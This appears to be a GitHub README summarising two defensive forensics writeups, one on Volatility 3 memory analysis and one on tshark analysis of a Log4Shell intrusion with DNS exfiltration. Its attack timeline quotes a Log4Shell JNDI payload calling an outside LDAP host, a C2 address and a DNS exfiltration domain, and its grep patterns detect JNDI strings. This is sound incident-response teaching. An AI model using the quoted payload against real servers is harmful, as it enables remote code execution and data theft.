# 🔬 Forensics Lab — Writeups

> Digital forensics investigation writeups — memory analysis with Volatility,
> network forensics with Wireshark/tshark, and malware traffic analysis.

[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![NIST](https://img.shields.io/badge/NIST-SP%20800--86-blue?style=flat-square)](https://csrc.nist.gov/publications/detail/sp/800-86/final)
[![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-red?style=flat-square)](https://attack.mitre.org)

---

## Overview

Detailed forensic investigation writeups demonstrating real-world analysis
techniques. Each writeup follows the **NIST SP 800-86** digital forensics
methodology and maps findings to **MITRE ATT&CK**.

---

## Writeups

### WU-001 — Memory Forensics: Detecting Malware with Volatility 3

**Scenario:** A Windows workstation was flagged by EDR for suspicious activity.
A memory dump was captured before the system was isolated.

**Objective:** Identify malicious processes, network connections, persistence
mechanisms, and extract indicators of compromise from the memory image.

**Tools:** Volatility 3, strings, base64, sha256sum

#### Investigation Steps

**Step 1 — Identify Running Processes**

```bash
# List all processes
python vol.py -f memory.dmp windows.pslist

# Find suspicious process names
python vol.py -f memory.dmp windows.pslist | grep -E "(cmd|powershell|wscript|rundll32)"

# Process tree (parent-child)
python vol.py -f memory.dmp windows.pstree
```

**Step 2 — Network Connections**

```bash
# Active and terminated connections
python vol.py -f memory.dmp windows.netstat

# Filter by state
python vol.py -f memory.dmp windows.netstat | grep "ESTABLISHED"
```

**Step 3 — Command Line Analysis**

```bash
# What commands were executed?
python vol.py -f memory.dmp windows.cmdline

# PowerShell history
python vol.py -f memory.dmp windows.cmdline | grep -i powershell
```

**Step 4 — File Artifacts**

```bash
# Find suspicious files in memory
python vol.py -f memory.dmp windows.filescan | grep -E "\.(exe|dll|ps1|bat|vbs)"

# Extract file from memory
python vol.py -f memory.dmp windows.dumpfiles --physaddr <ADDRESS>
```

**Step 5 — Registry Persistence**

```bash
# Check Run keys (common persistence)
python vol.py -f memory.dmp windows.registry.printkey \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

#### Findings (Example)

| IOC                                          | Type            | MITRE     |
| -------------------------------------------- | --------------- | --------- |
| `svchost.exe` spawned by `powershell.exe`    | Process anomaly | T1059.001 |
| `185.220.101.47:4444` ESTABLISHED            | C2 connection   | T1071     |
| Base64-encoded PowerShell payload            | Obfuscation     | T1027     |
| `HKCU\...\Run: "updater"="C:\temp\evil.exe"` | Persistence     | T1547.001 |

**[Full Writeup →](writeups/WU-001-volatility-memory-forensics.md)**

---

### WU-002 — Network Forensics: Log4Shell Attack Chain + DNS Exfiltration

**Scenario:** IDS alert for unusual DNS queries and outbound connections.
A PCAP was captured during the incident window.

**Objective:** Reconstruct the attack chain — from initial Log4Shell exploitation
through DNS-based C2 communication and data exfiltration.

**Tools:** tshark, Wireshark, CyberChef, Python

#### Investigation Steps

**Step 1 — Initial Triage**

```bash
# Overview of capture
tshark -r capture.pcap -q -z conv,tcp | head -20
tshark -r capture.pcap -q -z io,phs

# Extract unique conversations
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | sort -u
```

**Step 2 — HTTP Analysis**

```bash
# Find HTTP requests with Log4Shell payload
tshark -r capture.pcap -Y http.request -T fields \
  -e frame.time -e ip.src -e http.request.uri \
  | grep -E "jndi|ldap|rmi|dns"

# Log4Shell signatures
tshark -r capture.pcap -Y 'http contains "jndi:"' \
  -T fields -e http.request.full_uri
```

**Step 3 — DNS Tunnel Detection**

```bash
# Suspicious DNS queries (long labels)
tshark -r capture.pcap -Y dns -T fields \
  -e frame.time -e ip.src -e dns.qry.name \
  | awk '{if (length($3) > 50) print}'

# High-entropy DNS queries (potential tunneling)
tshark -r capture.pcap -Y "dns.qry.type == 1" \
  -T fields -e dns.qry.name > dns_queries.txt

python -c "
import math, collections
lines = open('dns_queries.txt').read().splitlines()
for q in lines:
    label = q.split('.')[0]
    if len(label) > 20:
        freq = collections.Counter(label)
        e = -sum(f/len(label)*math.log2(f/len(label)) for f in freq.values())
        if e > 3.8:
            print(f'HIGH ENTROPY: {q[:80]} (entropy={e:.2f})')
"
```

**Step 4 — Reconstruct Attack Chain**

```
Timeline:
09:00:01  HTTP GET /search?q=${jndi:ldap://185.220.101.47/a}   ← Log4Shell
09:00:02  DNS  ${jndi:ldap://185.220.101.47/a}                 ← LDAP callback
09:00:03  TCP  185.220.101.47:1389 → victim:random             ← Malicious class
09:00:04  DNS  aGVsbG8gd29ybGQ.evil-c2.xyz (high entropy)      ← DNS C2 established
09:00:05+ DNS  [encoded data].evil-c2.xyz × 847 queries         ← Data exfiltration
```

#### Key Findings

| Finding                   | Evidence                             | MITRE     |
| ------------------------- | ------------------------------------ | --------- |
| Log4Shell exploitation    | JNDI payload in HTTP User-Agent      | T1190     |
| LDAP callback             | TCP to 185.220.101.47:1389           | T1059     |
| DNS C2                    | High-entropy subdomain queries       | T1071.004 |
| Data exfiltration via DNS | 847 queries with base32 encoded data | T1048.003 |

**[Full Writeup →](writeups/WU-002-network-pcap-analysis.md)**

---

## Investigation Methodology

Both writeups follow **NIST SP 800-86** phases:

```
1. Collection      — Acquire evidence (memory dump, PCAP, disk image)
2. Examination     — Process and extract data
3. Analysis        — Identify patterns and anomalies
4. Reporting       — Document findings with timeline
```

---

## Repository Structure

```
forensics-lab/
├── README.md
└── writeups/
    ├── WU-001-volatility-memory-forensics.md
    └── WU-002-network-pcap-analysis.md
```

---

## References

- [Volatility 3 Documentation](https://volatility3.readthedocs.io)
- [NIST SP 800-86 — Digital Forensics Guide](https://csrc.nist.gov/publications/detail/sp/800-86/final)
- [MITRE ATT&CK — Exfiltration over DNS T1048.003](https://attack.mitre.org/techniques/T1048/003/)
- [CVE-2021-44228 — Log4Shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Wireshark Display Filters](https://www.wireshark.org/docs/dfref/)

---

*Built by [Marcio Coutinho](https://github.com/marciolscoutinho) — Cybersecurity Specialist · Porto, Portugal*
